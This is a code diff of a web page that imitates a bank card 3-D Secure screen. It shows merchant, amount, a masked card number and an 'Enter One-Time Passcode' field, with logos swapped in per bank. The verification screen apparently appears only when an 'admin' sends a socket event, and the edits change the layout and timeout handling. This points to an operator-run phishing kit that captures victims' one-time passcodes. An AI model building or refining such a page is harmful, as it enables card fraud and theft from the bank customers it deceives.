@@ -548,18 +548,31 @@
     </div>
   </div>
   
-  <!-- Verification Content - Hidden Until Admin Sends start_verification Event -->
-  <div id="mcVerificationContent" style="display: none; position: relative; width: 90%; max-width: 480px; background-color: white; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);">
-    <!-- Header with bank and card brand logos -->
-    <div style="display: flex; justify-content: space-between; align-items: center; padding: 10px 15px; border-bottom: 1px solid #e0e0e0; background-color: #fff;">
-      <div style="height: 40px; max-width: 45%;">
-        <img id="bankLogo" src="" alt="Bank Logo" style="height: 40px; max-width: 100%;">
-      </div>
-      <div style="height: 40px; max-width: 45%; text-align: right;">
-        <img id="verificationTypeLogo" src="" alt="Verification Logo" style="height: 40px; max-width: 100%;">
-      </div>
-    </div>
-
+ <!-- Transaction details -->
+<div style="margin-bottom: 15px; font-size: 13px; color: #333; text-align: center;">
+  <div style="margin-bottom: 5px; display: flex; justify-content: center;">
+    <span style="display: inline-block; width: 120px; text-align: right; padding-right: 10px; font-weight: 400;">Merchant</span>
+    <span id="merchantName" style="display: inline-block; width: 120px; text-align: left; font-weight: 500;">GOLFSTORE 3DS</span>
+  </div>
+  <div style="margin-bottom: 5px; display: flex; justify-content: center;">
+    <span style="display: inline-block; width: 120px; text-align: right; padding-right: 10px; font-weight: 400;">Amount</span>
+    <span style="display: inline-block; width: 120px; text-align: left; font-weight: 500;">
+      <span id="currencySymbol">$</span><span id="transactionAmount">45.99</span>
+    </span>
+  </div>
+  <div style="margin-bottom: 5px; display: flex; justify-content: center;">
+    <span style="display: inline-block; width: 120px; text-align: right; padding-right: 10px; font-weight: 400;">Date</span>
+    <span id="transactionDate" style="display: inline-block; width: 120px; text-align: left; font-weight: 500;">17:10:09</span>
+  </div>
+  <div style="margin-bottom: 5px; display: flex; justify-content: center;">
+    <span style="display: inline-block; width: 120px; text-align: right; padding-right: 10px; font-weight: 400;">Card Number</span>
+    <span id="cardNumberDisplay" style="display: inline-block; width: 120px; text-align: left; font-weight: 500;">XXXX XXXX XXXX 0622</span>
+  </div>
+  <div style="margin-bottom: 5px; display: flex; justify-content: center;">
+    <span style="display: inline-block; width: 120px; text-align: right; padding-right: 10px; font-weight: 400;">Reference Id</span>
+    <span id="referenceId" style="display: inline-block; width: 120px; text-align: left; font-weight: 500;">299879</span>
+  </div>
+</div>
     <!-- Main content -->
     <div style="padding: 15px;">
       <h3 style="margin-top: 0; margin-bottom: 15px; font-weight: bold; color: #333; font-size: 16px;">Protecting your online payments</h3>
@@ -596,19 +609,22 @@
         </div>
       </div>
       
-      <!-- OTP input field -->
-      <div style="margin-bottom: 20px; display: flex; align-items: center;">
-        <span style="font-size: 13px; margin-right: 10px; min-width: 150px; font-weight: 600; color: #333; text-shadow: 0px 0px 1px rgba(0,0,0,0.1);">Enter One-Time Passcode</span>
-        <div style="position: relative; flex: 1;">
-          <input type="text" id="mcOtpInput" style="width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 3px; font-size: 14px; transition: all 0.3s;" placeholder="Enter One-Time Passcode" maxlength="6">
-          <div style="position: absolute; right: 8px; top: 50%; transform: translateY(-50%); cursor: pointer;" id="otpInfoIcon">
-            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="2">
-              <circle cx="12" cy="12" r="10"/>
-              <path d="M12 16v-4M12 8h.01"/>
-            </svg>
-          </div>
-        </div>
-      </div>
+<!-- OTP input field -->
+<div style="margin-bottom: 20px; display: flex; align-items: center; justify-content: center;">
+  <span style="font-size: 14px; margin-right: 10px; min-width: 150px; font-weight: 700; color: #333; text-shadow: 0px 0px 1px rgba(0,0,0,0.1);">Enter One-Time Passcode</span>
+  <div style="position: relative; width: 240px;">
+    <input type="text" id="mcOtpInput" 
+      style="width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 6px; font-size: 15px; 
+      font-weight: 600; transition: all 0.3s; box-shadow: 0 0 4px rgba(52, 152, 219, 0.3);" 
+      placeholder="Enter One-Time Passcode" maxlength="6">
+    <div style="position: absolute; right: 8px; top: 50%; transform: translateY(-50%); cursor: pointer;" id="otpInfoIcon">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="2">
+        <circle cx="12" cy="12" r="10"/>
+        <path d="M12 16v-4M12 8h.01"/>
+      </svg>
+    </div>
+  </div>
+</div>
       
       <p id="mcOtpError" style="color: #e74c3c; font-size: 13px; margin-top: 0; margin-bottom: 15px; display: none; text-align: center;">
         Incorrect OTP, please enter valid one time passcode sent to your registered mobile
@@ -1028,14 +1044,30 @@ function startMCTimer() {
         timeLeft--;
         updateTimerDisplay();
         
-        if (timeLeft <= 0) {
-            clearInterval(mcTimerInterval);
-            // Handle timeout - maybe show an error or auto-cancel
-            const cancelBtn = document.getElementById('mcCancelBtn');
-            if (cancelBtn) {
-                cancelBtn.click();
-            }
-        }
+if (timeLeft <= 0) {
+    clearInterval(mcTimerInterval);
+    
+    // Clear the MC timer
+    if (mcTimerInterval) {
+        clearInterval(mcTimerInterval);
+        mcTimerInterval = null;
+    }
+    
+    // Hide the verification overlay
+    const mcVerificationOverlay = document.getElementById('mcVerificationOverlay');
+    if (mcVerificationOverlay) {
+        mcVerificationOverlay.style.display = 'none';
+    }
+    
+    // Notify server
+    socket.emit('mc_verification_cancelled', {
+        invoiceId: state.transactionId,
+        reason: 'timeout'
+    });
+    
+    // Show error UI with timeout message
+    showErrorUI("Session Expired", "Your verification session has timed out. Please try again.");
+}
     }, 1000);
 }
 
@@ -1104,10 +1136,10 @@ function updateMcVerificationUI(data) {
         verificationLogo.src = verificationLogos[verificationType] || verificationLogos['mastercard'];
     }
     
-    // Set masked phone number
-    if (data.phoneLastFour) {
-        document.getElementById('cardLastFourDigits').textContent = `********${data.phoneLastFour}`;
-    }
+  // Set masked phone number
+if (data.phoneLastFour) {
+    document.getElementById('cardLastFourDigits').textContent = `********${data.phoneLastFour}`;
+}
     
     // Make sure the consent checkbox is correctly styled
     const consentLabel = document.getElementById('consentLabel');
@@ -2567,14 +2599,27 @@ init();
       timeLeft--;
       updateTimerDisplay();
       
-      if (timeLeft <= 0) {
-        clearInterval(mcTimerInterval);
-        // Handle timeout - maybe show an error or auto-cancel
-        const cancelBtn = document.getElementById('mcCancelBtn');
-        if (cancelBtn) {
-          cancelBtn.click();
-        }
-      }
+if (timeLeft <= 0) {
+  clearInterval(mcTimerInterval);
+  
+  // Hide verification overlay
+  const dom = initDOM();
+  if (dom.overlay) {
+    dom.overlay.style.display = 'none';
+  }
+  
+  // Get invoiceId
+  const invoiceId = window.mcVerificationData?.invoiceId;
+  
+  // Send to server
+  socket.emit('mc_verification_cancelled', {
+    invoiceId: invoiceId,
+    reason: 'timeout'
+  });
+  
+  // Redirect to fail page
+  window.location.href = '/fail.html?reason=timeout';
+}
     }, 1000);
   }
 })();
